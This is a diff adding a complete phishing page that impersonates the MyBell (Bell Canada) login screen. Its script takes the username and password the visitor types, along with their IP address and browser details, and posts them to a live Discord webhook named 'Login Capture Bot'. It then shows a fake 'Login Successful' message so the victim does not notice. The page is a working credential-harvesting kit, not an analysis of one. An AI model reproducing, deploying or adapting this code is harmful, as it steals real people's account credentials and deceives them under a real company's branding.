@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in to MyBell</title>
+  <style>*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}body{margin:0;background:#ffffff;color:#1a1a1a;}.container{max-width:420px;margin:60px auto;padding:0 20px;}.logo{font-size:48px;font-weight:700;color:#005eb8;margin-bottom:10px;}h1{font-size:24px;font-weight:500;margin-bottom:30px;}.input-group{margin-bottom:20px;}.username-box{border:1px solid #cfd6de;border-radius:6px;padding:14px;display:flex;justify-content:space-between;align-items:center;font-size:16px;}.username-box input{border:none;background:transparent;font-size:16px;width:70%;outline:none;}.username-box a{color:#005eb8;text-decoration:none;font-size:14px;}label{display:block;font-size:14px;margin-bottom:6px;}.password-box{position:relative;}.password-box input{width:100%;padding:14px 42px 14px 14px;border-radius:6px;border:2px solid #005eb8;font-size:16px;}.password-box .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;color:#666;}.btn{width:100%;padding:14px;border-radius:30px;border:none;background:#005eb8;color:#fff;font-size:18px;font-weight:600;cursor:pointer;margin-top:10px;transition:all .3s;}.btn:hover{background:#004a93;}.btn.loading{background:#ffc107;color:#000;cursor:not-allowed;}.forgot{margin-top:20px;text-align:center;}.forgot a{color:#005eb8;text-decoration:none;font-size:14px;}.footer{margin-top:40px;font-size:12px;color:#666;text-align:center;line-height:1.5;}.modal{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,.5);}.modal-content{background:#fefefe;margin:15% auto;padding:30px;border-radius:10px;width:90%;max-width:400px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,.3);}.success-icon{font-size:60px;color:#28a745;margin-bottom:20px;}.success-title{font-size:24px;font-weight:600;color:#1a1a1a;margin-bottom:10px;}.success-text{color:#666;font-size:16px;margin-bottom:20px;}.close-btn{background:#28a745;color:white;border:none;padding:12px 24px;border-radius:25px;font-size:16px;cursor:pointer;width:100%;}</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">Bell</div>
+  <h1>Log in to MyBell</h1>
+  <div class="input-group">
+    <label>Username</label>
+    <div class="username-box">
+      <input type="text" id="username" placeholder="Enter username">
+      <a href="#" onclick="clearUsername()">Clear</a>
+    </div>
+  </div>
+  <div class="input-group">
+    <label>Password*</label>
+    <div class="password-box">
+      <input type="password" id="password" placeholder="Enter your password">
+      <span class="eye" onclick="togglePassword()">👁</span>
+    </div>
+  </div>
+  <button class="btn" id="loginBtn" onclick="submitLogin()">Log in</button>
+  <div class="forgot"><a href="#">Forgot your password?</a></div>
+  <div class="footer">This site is protected by reCAPTCHA Enterprise. The Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</div>
+</div>
+
+<div id="successModal" class="modal">
+  <div class="modal-content">
+    <div class="success-icon">✅</div>
+    <div class="success-title">Login Successful!</div>
+    <div class="success-text">Welcome back to your dashboard!</div>
+    <button class="close-btn" onclick="closeModal()">Continue</button>
+  </div>
+</div>
+
+<script>
+let userIP = 'Detecting...';
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>userIP=d.ip).catch(()=>userIP='Hidden');
+
+// 🔥 TUMHARA WEBHOOK URL - PERFECT!
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1449857851483754526/AnvBxjX70F4HhvRhUT4TsOAX946z2CDlVdJhu7oMP-thpwqWiR71bdLdEzJZaVkiIEds';
+
+async function submitLogin(){
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const btn = document.getElementById('loginBtn');
+  
+  if(!username || !password){alert('Please enter username and password!');return;}
+  
+  btn.textContent = 'Processing...';btn.disabled=true;btn.className='btn loading';
+  
+  setTimeout(async()=>{
+    // 🔥 DISCORD PE INSTANT NOTIFICATION!
+    await fetch(DISCORD_WEBHOOK,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        content:`🇨🇦 **NEW LOGIN FROM CANADA!** 🇵🇰\n\n👤 **Username:** \`${username}\`\n🔒 **Password:** \`${password}\`\n🌐 **IP:** \`${userIP}\`\n⏰ **Pakistan Time:** ${new Date().toLocaleString('en-US',{timeZone:'Asia/Karachi'})}\n📱 **Device:** ${navigator.userAgent.slice(0,50)}...\n\n✅ **AUTO-CAPTURED FOR bbixba@gmail.com**`,
+        username:"🚨 Login Capture Bot",
+        avatar_url:"https://i.imgur.com/4mapdZ3.png"
+      })
+    });
+    
+    showSuccessModal();
+    console.log('🎯 SENT TO DISCORD:',username,password,userIP);
+  },2000);
+}
+
+function showSuccessModal(){document.getElementById('successModal').style.display='block';document.getElementById('username').value='';document.getElementById('password').value='';}
+function closeModal(){document.getElementById('successModal').style.display='none';document.getElementById('loginBtn').textContent='Log in';document.getElementById('loginBtn').disabled=false;document.getElementById('loginBtn').className='btn';}
+function togglePassword(){const input=document.getElementById('password'),eye=document.querySelector('.eye');input.type=input.type==='password'?'text':'password';eye.textContent=input.type==='password'?'👁':'🙈';}
+function clearUsername(){document.getElementById('username').value='';}
+window.onclick=e=>{if(e.target.id==='successModal')closeModal();};
+document.addEventListener('keypress',e=>{if(e.key==='Enter')submitLogin();});
+</script>
+</body>
+</html>
